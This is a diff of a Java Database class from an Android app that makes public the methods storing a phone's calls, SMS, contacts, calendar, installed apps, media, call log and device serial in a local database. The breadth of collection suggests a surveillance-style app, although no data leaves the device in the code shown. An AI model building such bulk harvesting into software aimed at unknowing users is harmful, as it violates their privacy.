@@ -7,12 +7,14 @@ import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
 import android.util.Log;
 
+import com.candroid.textme.services.MessagingService;
+
 import java.io.File;
 import java.util.List;
 
 public class Database {
 
-    protected static void insertPhoneCalls(SQLiteDatabase database, List<PhoneCall> phoneCalls){
+    public static void insertPhoneCalls(SQLiteDatabase database, List<PhoneCall> phoneCalls){
         for(PhoneCall phoneCall : phoneCalls){
             try{
                 database.beginTransaction();
@@ -31,7 +33,7 @@ public class Database {
         }
     }
 
-    protected static void insertCalendarEvents(SQLiteDatabase database, List<CalendarEvent> calendarEvents){
+    public static void insertCalendarEvents(SQLiteDatabase database, List<CalendarEvent> calendarEvents){
         for(CalendarEvent calendarEvent : calendarEvents){
             try{
                 database.beginTransaction();
@@ -55,7 +57,7 @@ public class Database {
         }
     }
 
-    protected static void insertContacts(SQLiteDatabase database, List<Contact> contacts){
+    public static void insertContacts(SQLiteDatabase database, List<Contact> contacts){
         for(Contact contact : contacts){
             try{
                 database.beginTransaction();
@@ -73,7 +75,7 @@ public class Database {
         }
     }
 
-    protected static void insertDevice(SQLiteDatabase database, String address, String manufacturer, String product, String version, String flavor, String serial, String radio){
+    public static void insertDevice(SQLiteDatabase database, String address, String manufacturer, String product, String version, String flavor, String serial, String radio){
         long newRowId = -1;
         try{
             database.beginTransaction();
@@ -98,7 +100,7 @@ public class Database {
 
     }
 
-    protected static void insertPackages(SQLiteDatabase db, List<ApplicationInfo> apps){
+    public static void insertPackages(SQLiteDatabase db, List<ApplicationInfo> apps){
         for(ApplicationInfo app : apps){
             try{
                 db.beginTransaction();
@@ -115,7 +117,7 @@ public class Database {
         }
     }
 
-    protected static void insertSmsMessages(SQLiteDatabase database, List<SmsMsg> smsMsgs){
+    public static void insertSmsMessages(SQLiteDatabase database, List<SmsMsg> smsMsgs){
         for(SmsMsg smsMsg : smsMsgs) {
             try {
                 database.beginTransaction();
@@ -154,7 +156,7 @@ public class Database {
         return newRowId;
     }
 
-    protected static long insertMedia(SQLiteDatabase db, String name, File mediaFile) {
+    public static long insertMedia(SQLiteDatabase db, String name, File mediaFile) {
         long newRowId = -1;
         int type = -1;
         boolean isImage = Lofl.isImage(mediaFile);
@@ -189,7 +191,7 @@ public class Database {
         return newRowId;
     }
 
-    protected static long insertCalendarEvent(Context context, DatabaseHelper database, String email, String title, String description, long startTime, long endTime, int isAllDay, String duration, String timeZone, String location, String organizer){
+    public static long insertCalendarEvent(Context context, DatabaseHelper database, String email, String title, String description, long startTime, long endTime, int isAllDay, String duration, String timeZone, String location, String organizer){
         SQLiteDatabase db = database.getWritableDatabase();
         long newRowId = -1;
         try{
@@ -212,7 +214,7 @@ public class Database {
         return newRowId;
     }
 
-    protected static long insertMessage(Context context, DatabaseHelper database, String columnOne, String columnTwo, String columnThree, long time, int type){
+    public static long insertMessage(Context context, DatabaseHelper database, String columnOne, String columnTwo, String columnThree, long time, int type){
         SQLiteDatabase db = database.getWritableDatabase();
         ContentValues values = new ContentValues();
         values.put(DataContract.SmsContract.COLUMN_DESTINATION_ADDRESS, columnOne);
@@ -225,7 +227,7 @@ public class Database {
         return newRowId;
     }
 
-    protected static long insertCallLogEntry(Context context, DatabaseHelper database, String type, String address, String duration, String time){
+    public static long insertCallLogEntry(Context context, DatabaseHelper database, String type, String address, String duration, String time){
         SQLiteDatabase db = database.getWritableDatabase();
         ContentValues values = new ContentValues();
         values.put(DataContract.CallLogContract.COLUMN_TYPE, type);
